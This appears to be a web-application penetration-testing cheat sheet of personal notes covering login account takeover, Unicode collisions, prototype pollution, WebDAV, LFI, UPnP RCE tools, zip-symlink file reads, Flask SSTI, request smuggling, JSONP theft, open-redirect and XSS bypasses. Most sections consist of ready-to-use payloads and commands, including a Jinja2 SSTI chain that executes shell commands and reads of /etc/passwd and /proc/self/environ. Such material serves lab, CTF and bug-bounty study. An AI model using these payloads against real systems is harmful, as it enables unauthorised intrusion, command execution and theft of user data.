## Login exploits

	1. While registering account, try to append a space at the end of already registered email to attempt user account takeover(db removes trailing space while inserting however application not).

	2. If email maximum length is fixed and characters after allowed length are stripped, try to register an email having spaces appended till maximum character length + any character at end, eg <admin@htb.com      #>. 

## Unicode Collisions

unicode characters collide with few english characters. This fact can be used to exploit functionalities like - when Forgot password emails validated against lowercase/uppercase value on file, but sent to the provided input email.

```
// https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/

//uppercase scenario
chr(0x017f).upper()=='S'	# returns True
chr(0x0131).upper()=='I'

// lowercase scenario
chr(0x212A).lower()=='k'
```

## Javascript prototype pollution

Using this bug, we can set new properties of objects. Eg- we can set json object {"user":"test"} new property admin=true if server takes json data and sets attributes using it. 

payload `{"user":"test","__proto__":{"admin":true}}`

```
a={}
b=1
c='ds'

# polluting prototype
a.__proto__.foo='bar'

# All objects have foo property now with value bar
d=new Object
d.foo=='bar'	# true
b.foo=='bar'	# true
```

## WebDAV/PUT method enabled

```
curl -X PUT http://192.168.14.129/dav/test.txt
cadaver http://target/dav
```


## LFI

```
cat /proc/version
cat /etc/issue
cat /proc/self/environ
cat /proc/net/tcp	# listening processes tcp
cat /proc/net/udp	# listening processes udp
```

## Universal Plug and Play UPnP 

* Windows Device Portal - port 8080

	Windows IoT Core devices support a special webserver called the Device Portal. Windows Device Portal runs on port 8080 in Development mode and has default credentials as Administrator and p@ssw0rd (zero).

	RCE can be acheived using the vulnerability in Sirep/WPCon communications protocol included with Windows IoT operating system.

	```
	// git clone the repo
	https://github.com/SafeBreach-Labs/SirepRAT
	```

* CallStranger(CVE-2020-12695) Vulnerability - port 37215

	The vulnerability – CallStranger – is caused by Callback header value in UPnP SUBSCRIBE function can be controlled by an attacker and enables an SSRF-like vulnerability.

	```
	// git clone the repo
	https://github.com/yunuscadirci/CallStranger
	```

## Zip Symlink

If zip files can be uploaded and content is accessible. Try to access local files using this bug. 

```
mkdir test
cd test
ln -s /etc/passwd link.txt
cat link.txt 		# prints content of /etc/passwd
zip --symlinks -r test.zip test/
unzip -l test.zip
```

## Flask Template Injection SSTI

Check with basic template injection payload {{ 7* 7}} and if it evaluates, try to further exploit it. May be it reflects at multiple places, make sure to check them all.

```
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

{{ config.items() }}	#see config items

#Get subprocess.Popen object using mro(parent) and subclasses
{{ ''.__class__.__mro__[1].__subclasses__() }}

#Execute command
{{‘’.__class__.__mro__[1].__subclasses__()[287]('ls',shell=True,stdout=-1).communicate()}}
```

## Request Smuggling

Pass both content-length and Transfer-Encoding header when posting data to an endpoint. Try CL-TE, TE-CL and TE-TE attack.

Make sure to change connection header to keep-alive. Also use mandatory headers like Host, user-agent and cookie to avoid server discarding the request. For post request, use content-length and content-type header as well. 

```
Remember Transfer encoding uses hex numbers to represent chunk size.

## CL-TE example (CL frontend, TE backend)

Content-Length: 50
Transfer-Encoding:chunked

0

POST /404 HTTP/1.1
Host: 10.10.14.93
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Cookie: session=abcd

msg=abc
```

## JsonP

Check if website returns sensitive json data.  If so, try to append query parameter jsonp or callback and see if jsonp is supported. 

Jsonp exploit works in firefox only.

```
<script>
      userinfo = function (data) {
      alert(JSON.stringify(data));
      };  
</script>
<script src="https://www.bugbountytraining.com/challenges/challenge-15.php?jsonp=userinfo" type="text/javascript"></script>
 Challenge hints
(click to reveal)
 Guides
Understanding Application/Business Logic vulnerabilities
```

## Open Redirect (Bypass)

```
# If . is not allowed, we can use %E3%80%82 which also evaluates to . and works fine
redirectUri=http://example%E3%80%82com#.bugbountyhunter.com

redirectUrl=/%0d/example.com/
redirectUri=https://example.com#.target.com/
redirectUri=https://example.com/.target.com/
redirectUri=https://example.com\.target.com/
redirectUri=https://example.com?.target.com/
```

## XSS (bypass events)

```
onpointerrawupdate='alert(0)'
onmouseleave='alert(0)'
```